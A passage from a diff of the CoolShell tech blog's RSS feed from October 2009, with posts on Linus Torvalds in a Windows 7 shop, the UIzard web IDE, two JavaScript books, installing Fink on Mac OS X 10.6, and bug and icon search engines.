+     crossorigin="anonymous"></script>正当Windows 7 开始热卖的时候，正当广大北美用户抱怨Windows 7的销售价格，在东方要比西方便宜很多的时候。我们著名的Linus Torvalds来到了日本东京的一个软件商店里“庆祝Windows 7的Release”，难道他是去那里买一份便宜的Windows 7？</p>
+<p style="text-align: center;"><a href="http://www.flickr.com/photos/offthebroiler/4036243510/sizes/o/" target=_blank><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2009/10/Linus_windows_7.jpg" alt="Linus Torvalds 在一个日本的软件商店" width="475" /></a></p>
+<p style="text-align: center;"><em>Linus Torvalds, 图片来自一个未经确认的 Yodobashi 商店， Tokyo, Japan. 来源: Jim Zemlin/The Linux Foundation (<strong>点击看大图</strong>)</em></p>
+<p>这个图片目前还没有新闻报道，不过已有很多来源可以参考了……</p>
+<p><span id="more-1619"></span></p>
+<p>Linus在日本参加一个<a href="http://events.linuxfoundation.org/events/japan-linux-symposium"><strong>Japan Linux Symposium</strong></a>的座谈会，在一个Picaca的<a href="http://picasaweb.google.com/cschlaeger/JapanLinuxSymposium#5395400000458161906" target="_blank">链接</a>上说，Microsoft选择了和Japan Linux Symposium同一天，在座谈会的间隙，Linus和其同事想做点有趣的事情，于是他们来到了Windows 7的小商店里，当然，售货员同志并不知道这人是谁，而Linus一进店里马上就做了一个下蹲坚大拇指的手势，而他的同事很识相地马上就照了一张照片。呵呵，当然，他们什么也没有买。</p>
+<p>而在一个据说是照片作者的 <a href="http://blogs.zdnet.com/perlow/?p=11403" target="_blank">BLOG</a> 上，博主也证实了相关的说法，说，这是Linus的一种幽默的态度，还说，Linus应该做一个V字型的手势而不是大拇指，这主要是Linus对东方文不了解。呵呵。</p>
+<p>呵呵，很有意思吧。<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/16910.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/7.jpg" alt="Linus：为何对象引用计数必须是原子的" width="150" height="150" /></a><a href="https://coolshell.cn/articles/16910.html" class="wp_rp_title">Linus：为何对象引用计数必须是原子的</a></li><li ><a href="https://coolshell.cn/articles/9917.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/10.jpg" alt="Alan Cox：大教堂、市集与市议会" width="150" height="150" /></a><a href="https://coolshell.cn/articles/9917.html" class="wp_rp_title">Alan Cox：大教堂、市集与市议会</a></li><li ><a href="https://coolshell.cn/articles/8990.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/02/linus_pointer_to_pointer-150x150.jpg" alt="Linus：利用二级指针删除单向链表" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8990.html" class="wp_rp_title">Linus：利用二级指针删除单向链表</a></li><li ><a href="https://coolshell.cn/articles/8275.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/13.jpg" alt="对九个超级程序员的采访" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8275.html" class="wp_rp_title">对九个超级程序员的采访</a></li><li ><a href="https://coolshell.cn/articles/7490.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/06/f1-150x150.jpg" alt="性能调优攻略" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7490.html" class="wp_rp_title">性能调优攻略</a></li><li ><a href="https://coolshell.cn/articles/5107.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/5.jpg" alt="10大经典错误" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5107.html" class="wp_rp_title">10大经典错误</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1619.html">Windows 7 的新粉丝 Linus Torvalds</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1619.html/feed</wfw:commentRss>
+			<slash:comments>13</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Ajax开发利器UIzard</title>
+		<link>https://coolshell.cn/articles/1611.html</link>
+					<comments>https://coolshell.cn/articles/1611.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Thu, 22 Oct 2009 15:40:30 +0000</pubDate>
+				<category><![CDATA[Ajax开发]]></category>
+		<category><![CDATA[Web开发]]></category>
+		<category><![CDATA[编程工具]]></category>
+		<category><![CDATA[AJAX]]></category>
+		<category><![CDATA[UIzard]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1611</guid>
+
+					<description><![CDATA[<p>正如UIzard这个名字所暗示的，这是一个User Interface 的Wizard，从字面上理解，这是一个做界面的向导。这有什么奇怪的，Dreamwave之...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1611.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1611.html">Ajax开发利器UIzard</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><a href="https://coolshell.cn/wp-content/uploads/2009/10/uizard2.jpg"></a>正如UIzard这个名字所暗示的，这是一个User Interface 的Wizard，从字面上理解，这是一个做界面的向导。这有什么奇怪的，Dreamwave之流已经是相当的成熟了，还能好得过它？是的，这个开源的项目，也许并没有那些商业软件那么成熟，不过，我想告诉你的是，这个开源软件绝对是值得我们重点关注的一个软件。</p>
+<p>你可以理解为这是一个Web开发的IDE，不过其集成了Ajax方面的东西。这并不仅仅简单的是那种“所见即所得”的编辑器。而且，它也不信仅可以让那些非程序员非常简单地创建一个从前端到后端的Web应用，而且，他还可以让你连接数据库，创建非常复杂的布局和时间线，甚至于一些套件（白板，在线的类Word，Excel，PPT等功能），所有这些，你只需要简单的点几下按钮就可以了。真是相当的强大。（下面是个抓图）</p>
+<p style="text-align: center;"><img decoding="async" loading="lazy" title="UIzard" src="https://coolshell.cn/wp-content/uploads/2009/10/uizard2.jpg" alt="UIzard" width="500" height="344" /></p>
+<p><span id="more-1611"></span></p>
+<p>看上去很不错吧，上面的的屏幕抓图展示了，你可以非常简单地嵌入一些Google的API。而且，你还可以设置RSS相关的功能，是的，源代码是很复杂的，但是有了这个工具，你所需要的就是用鼠标点来点去。</p>
+<p>最NB的是，你不需要在你的硬盘上安装这个工具，你完全是一个基于Web的在线IDE，真是太强大了，这是我最最欣赏的地方，真是令人难以置信。</p>
+<p>最后需要说的，这个工具的作者是一个韩国人，叫 Ryu Sungtae（韩国人的软件MS越来越猛了，比如那个著名的Kmplayer也是韩国人做的）， UIzard 由 Yahoo’ User Interface Library (YUI) 构造，这是一个基于Javascript 的用于创建各种交互式应用的程序库。虽然，目前的UIzard 只是Beta版，版本号还很新，0.9版，不过，这个项目的潜力是相当的大，值我们关注。</p>
+<p>其官方站点是：<a href="http://www.uizard.org/" target="_blank">http://www.uizard.org/</a> </p>
+<p>如果你想体验一下，那么，请你猛击下面的链接吧：（使用Fixfox效果更好）</p>
+<p style="text-align: center;"><a href="http://www.uizard.org/UIzard/uizard.php" target="_blank">http://www.uizard.org/UIzard/uizard.php</a></p>
+<p><a href="https://coolshell.cn/wp-content/uploads/2009/10/uizard1.jpg"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-1614" title="UIzard创建工程" src="https://coolshell.cn/wp-content/uploads/2009/10/uizard1.jpg" alt="UIzard创建工程" width="500" height="310" srcset="https://coolshell.cn/wp-content/uploads/2009/10/uizard1.jpg 500w, https://coolshell.cn/wp-content/uploads/2009/10/uizard1-300x186.jpg 300w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<p>(全文完)<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/9749.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/06/javascript-150x150.jpg" alt="Javascript 装载和执行" width="150" height="150" /></a><a href="https://coolshell.cn/articles/9749.html" class="wp_rp_title">Javascript 装载和执行</a></li><li ><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/08/ajax_error-150x150.jpg" alt="一次Ajax查错的经历" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_title">一次Ajax查错的经历</a></li><li ><a href="https://coolshell.cn/articles/3013.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2010/09/biolab-150x150.jpg" alt="一些非常有意思的杂项资源" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3013.html" class="wp_rp_title">一些非常有意思的杂项资源</a></li><li ><a href="https://coolshell.cn/articles/2593.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/18.jpg" alt="Web版的VNC" width="150" height="150" /></a><a href="https://coolshell.cn/articles/2593.html" class="wp_rp_title">Web版的VNC</a></li><li ><a href="https://coolshell.cn/articles/909.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg" alt="7个免费强大的Ajax文件管理器" width="150" height="150" /></a><a href="https://coolshell.cn/articles/909.html" class="wp_rp_title">7个免费强大的Ajax文件管理器</a></li><li ><a href="https://coolshell.cn/articles/154.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2009/03/webmail1-150x150.jpg" alt="10个基于Ajax的PHP Webmail客户端" width="150" height="150" /></a><a href="https://coolshell.cn/articles/154.html" class="wp_rp_title">10个基于Ajax的PHP Webmail客户端</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1611.html">Ajax开发利器UIzard</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1611.html/feed</wfw:commentRss>
+			<slash:comments>4</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Javascript的两本书</title>
+		<link>https://coolshell.cn/articles/1608.html</link>
+					<comments>https://coolshell.cn/articles/1608.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Thu, 22 Oct 2009 15:12:25 +0000</pubDate>
+				<category><![CDATA[轶事趣闻]]></category>
+		<category><![CDATA[Javascript]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1608</guid>
+
+					<description><![CDATA[<p>Definition Guide 和 The Good Part， 犀牛和蝴蝶，一厚一薄，事情不言而喻。 （转载本站文章请注明作者和出处 酷 壳 &#8211;...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1608.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1608.html">Javascript的两本书</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>Definition Guide 和 The Good Part， 犀牛和蝴蝶，一厚一薄，事情不言而喻。</p>
+<p><a href="https://coolshell.cn/wp-content/uploads/2009/10/javascript.jpg"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-1609" title="O'Reilly Javascript 的两本书" src="https://coolshell.cn/wp-content/uploads/2009/10/javascript.jpg" alt="O'Reilly Javascript 的两本书" width="800" height="600" srcset="https://coolshell.cn/wp-content/uploads/2009/10/javascript.jpg 800w, https://coolshell.cn/wp-content/uploads/2009/10/javascript-300x225.jpg 300w, https://coolshell.cn/wp-content/uploads/2009/10/javascript-768x576.jpg 768w, https://coolshell.cn/wp-content/uploads/2009/10/javascript-360x270.jpg 360w" sizes="(max-width: 800px) 100vw, 800px" /></a><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg" alt="程序员练级攻略（2018)  与我的专栏" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018)  与我的专栏</a></li><li ><a href="https://coolshell.cn/articles/17634.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/01/pretty-code-150x150.gif" alt="Chrome开发者工具的小技巧" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17634.html" class="wp_rp_title">Chrome开发者工具的小技巧</a></li><li ><a href="https://coolshell.cn/articles/17524.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2016/10/drawing-recursive-150x150.jpg" alt="如何读懂并写出装逼的函数式代码" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17524.html" class="wp_rp_title">如何读懂并写出装逼的函数式代码</a></li><li ><a href="https://coolshell.cn/articles/10822.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/12/yoda-lambda-150x150.png" alt="函数式编程" width="150" height="150" /></a><a href="https://coolshell.cn/articles/10822.html" class="wp_rp_title">函数式编程</a></li><li ><a href="https://coolshell.cn/articles/10739.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/12/lua-150x150.gif" alt="Lua简明教程" width="150" height="150" /></a><a href="https://coolshell.cn/articles/10739.html" class="wp_rp_title">Lua简明教程</a></li><li ><a href="https://coolshell.cn/articles/10337.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg" alt="数据即代码：元驱动编程" width="150" height="150" /></a><a href="https://coolshell.cn/articles/10337.html" class="wp_rp_title">数据即代码：元驱动编程</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1608.html">Javascript的两本书</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1608.html/feed</wfw:commentRss>
+			<slash:comments>6</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>[推荐]基于Mac的Port工具Fink</title>
+		<link>https://coolshell.cn/articles/1592.html</link>
+					<comments>https://coolshell.cn/articles/1592.html#comments</comments>
+		
+		<dc:creator><![CDATA[free.wang]]></dc:creator>
+		<pubDate>Mon, 19 Oct 2009 11:06:41 +0000</pubDate>
+				<category><![CDATA[Unix/Linux]]></category>
+		<category><![CDATA[fink]]></category>
+		<category><![CDATA[Mac]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1592</guid>
+
+					<description><![CDATA[<p>看到标题，读者朋友们肯定第一时间想到的MacPort 。 恩，那是一款非常棒的工具。 不过我更愿意推荐各位使用另外一款工具 Fink(http://www.fi...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1592.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1592.html">[推荐]基于Mac的Port工具Fink</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>看到标题，读者朋友们肯定第一时间想到的MacPort 。</p>
+<p>恩，那是一款非常棒的工具。 不过我更愿意推荐各位使用另外一款工具 Fink(http://www.finkproject.org/).</p>
+<blockquote><p>Fink 项目希望把 Unix 上各种<a href="http://www.opensource.org/">开放源码</a>软件带到 <a href="http://www.opensource.apple.com/">Darwin</a> 和 <a href="http://www.apple.com/macosx/">Mac OS X</a> 平台上。 我们通过修改 Unix 软件使得它可以在 Mac OS X 上编译和运行（“移植”）,并提供一个方便的分发系统使得每个人都可以下载和使用它。 Fink 使用 <a href="http://www.debian.org/">Debian</a> 中的象 dpkg 和 apt-get 等工具来提供强大的二进制软件包管理。 你可以随意选择是下载预编译好的二进制安装包或从源代码自己构建一切。</p></blockquote>
+<p>关于 Fink的安装 ，大部分用户可参见http://www.finkproject.org/download/index.php?phpLang=zh。<br />
+不过后面我主要想介绍我的安装方式，因为我的Mac 版本是10.6 64bit.所以还是有些差别。也许上述普通方法有效，但是我并未尝试。</p>
+<p>安装步骤如下（感谢 <a href="http://sage.ucsc.edu/~wgscott/xtal/wiki/index.php/64-bit_Fink_for_10.6">http://sage.ucsc.edu/~wgscott/xtal/wiki/index.php/64-bit_Fink_for_10.6</a>）</p>
+<p><span id="more-1592"></span></p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">
+cvs -d:pserver:anonymous@fink.cvs.sourceforge.net:/cvsroot/fink login
+ #just hit return when prompted for password
+cvs -z3 -d:pserver:anonymous@fink.cvs.sourceforge.net:/cvsroot/fink co -P fink
+cd fink
+./bootstrap /sw
+</pre>
+<p>以上最后一步可能会花80%的时间，因为它会执行下载及编译这些很核心的工作。</p>
+<p>完成之后编辑 <span style="font-family: monospace, 'Times New Roman', 'Bitstream Charter', Times, serif;line-height: 24px;font-size: 17px;color: #99cc00">/<span style="color: #fffbc6"><span style="color: #99cc00">sw/etc/fink.conf </span><span style="color: #000000;font-family: Georgia, 'Times New Roman', 'Bitstream Charter', Times, serif;line-height: 19px;font-size: 13px">第4行为：</span></span></span></p>
+<p><span style="color: #ff6600;font-size: large"><span style="line-height: 24px"><span style="font-size: 12px"><strong><span style="color: #3366ff">Trees: local/main stable/main stable/crypto unstable/main unstable/crypto</span></strong></span></span></span></p>
+<p>接下来就可以使用fink了。 fink的启动 我加了如下代码</p>
+<pre data-enlighter-language="bash" class="EnlighterJSRAW">source /sw/bin/init.sh
+fink selfupdate-cvs
+fink -y update-all
+fink scanpackages
+</pre>
+<p>我建议 再执行一条</p>
+<p><code data-enlighter-language="bash" class="EnlighterJSRAW">echo &quot;source /sw/bin/init.sh&quot;  &gt;&gt; ~/.bash_profile</code></p>
+<p>这样新开终端进程的时候 就不用重新初始化fint了,完成以上步骤，就能使用fink了。</p>
+<p>我之所以抛弃了macport 是因为他目前出现的和新版10.6的冲突问题，导致系统gcc库环境出现错误，而macport又与系统架构上不兼容 ，导致Port不能用 gcc 也不能用，而我又准备拿光盘重装developer环境的时候，光驱坏了 DVD盘一律不能读 :shame goodness&#8230;!<br />
+fink的出现完全让我避开了以上问题，或许上述问题的出现有我个人原因。 但是fink有很重要的一点，就是它的源很快。他会自动推荐最适合我们的镜像。如果我们要随时更换fink的配置， 可以执行 <span style="color: #3366ff">fink configure.</span></p>
+<p>我相信读到这里，会有不少习惯Port的朋友使用 Fink， Just do it, Fink和MacPort 同时存在并不是什么坏事，虽然我已经把MacPort彻底删了。<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/2719.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/2.jpg" alt="苹果开发工具Xcode 4 第二预览版" width="150" height="150" /></a><a href="https://coolshell.cn/articles/2719.html" class="wp_rp_title">苹果开发工具Xcode 4 第二预览版</a></li><li ><a href="https://coolshell.cn/articles/1272.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2009/08/linux_airline-150x150.jpg" alt="操作系统航空公司" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1272.html" class="wp_rp_title">操作系统航空公司</a></li><li ><a href="https://coolshell.cn/articles/559.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/1.jpg" alt="菜鸟学PHP之Smarty入门" width="150" height="150" /></a><a href="https://coolshell.cn/articles/559.html" class="wp_rp_title">菜鸟学PHP之Smarty入门</a></li><li ><a href="https://coolshell.cn/articles/3433.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/10.jpg" alt="6个有用的MySQL语句" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3433.html" class="wp_rp_title">6个有用的MySQL语句</a></li><li ><a href="https://coolshell.cn/articles/3254.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2010/11/jpDEK-150x150.jpg" alt="一个人脸识别的Javascript" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3254.html" class="wp_rp_title">一个人脸识别的Javascript</a></li><li ><a href="https://coolshell.cn/articles/4261.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/15.jpg" alt="JavaMail使用" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4261.html" class="wp_rp_title">JavaMail使用</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1592.html">[推荐]基于Mac的Port工具Fink</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1592.html/feed</wfw:commentRss>
+			<slash:comments>2</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Bug 和 Icon 搜索引擎</title>
+		<link>https://coolshell.cn/articles/1582.html</link>
+					<comments>https://coolshell.cn/articles/1582.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Thu, 15 Oct 2009 02:55:02 +0000</pubDate>
+				<category><![CDATA[杂项资源]]></category>
+		<category><![CDATA[bug]]></category>
+		<category><![CDATA[icons]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1582</guid>
+
+					<description><![CDATA[<p>以前给大家推荐过一个《PDF电子书搜索引擎》，现在再来推荐两个： 一个是开源项目的bug搜索引擎（当你想要选用某个开源软件的时候，或是你发现有一些异常的时候，你...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1582.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1582.html">Bug 和 Icon 搜索引擎</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>以前给大家推荐过一个《<a rel="bookmark" href="https://coolshell.cn/articles/424.html">PDF电子书搜索引擎</a>》，现在再来推荐两个：</p>
+<p>一个是开源项目的bug搜索引擎（当你想要选用某个开源软件的时候，或是你发现有一些异常的时候，你可以先去看看是否有一些相关的BUG）</p>
+<p style="text-align: center;"><a href="http://bugspy.net/" target="_blank"><strong>http://bugspy.net/</strong></a></p>
+<p style="text-align: center;"><a href="http://bugspy.net/" target="_blank"><img decoding="async" src="http://bugspy.net/site_media/images/logo.png" alt="bugSpy.net" /></a></p>
+<p> </p>
+<p>还有一个是图标的搜索引擎（那些ICON还是比较精美的，可以用来做UI的开发）</p>
+<p style="text-align: center;"><a href="http://www.iconfinder.net/" target="_blank"><br />
+<strong>http://www.iconfinder.net/<br />
+</strong></a></p>
+<p style="text-align: center;"><a href="http://www.iconfinder.net/" target="_blank"><br />
+<img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2009/10/iconfinder.png" alt="Iconfinder provides high quality icons for webdesigners and developers in an easy and efficient way" width="376" height="153" /></a></p>
+<p style="text-align: left;">(全文完)</p>
+<p><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/11112.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/02/apple_goto_fail-150x150.png" alt="由苹果的低级Bug想到的" width="150" height="150" /></a><a href="https://coolshell.cn/articles/11112.html" class="wp_rp_title">由苹果的低级Bug想到的</a></li><li ><a href="https://coolshell.cn/articles/3.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2009/03/webicon3-150x150.png" alt="50套Web开发图标" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3.html" class="wp_rp_title">50套Web开发图标</a></li><li ><a href="https://coolshell.cn/articles/6913.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/10.jpg" alt="神奇的CSS形状 " width="150" height="150" /></a><a href="https://coolshell.cn/articles/6913.html" class="wp_rp_title">神奇的CSS形状 </a></li><li ><a href="https://coolshell.cn/articles/2529.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/6.jpg" alt="StackOverflow的404错误页" width="150" height="150" /></a><a href="https://coolshell.cn/articles/2529.html" class="wp_rp_title">StackOverflow的404错误页</a></li><li ><a href="https://coolshell.cn/articles/12012.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/10/edsm-150x150.gif" alt="State Threads 回调终结者" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12012.html" class="wp_rp_title">State Threads 回调终结者</a></li><li ><a href="https://coolshell.cn/articles/830.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/8.jpg" alt="语言的歧义" width="150" height="150" /></a><a href="https://coolshell.cn/articles/830.html" class="wp_rp_title">语言的歧义</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1582.html">Bug 和 Icon 搜索引擎</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1582.html/feed</wfw:commentRss>
+			<slash:comments>1</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>一张关于操作系统的图</title>
+		<link>https://coolshell.cn/articles/1579.html</link>
+					<comments>https://coolshell.cn/articles/1579.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
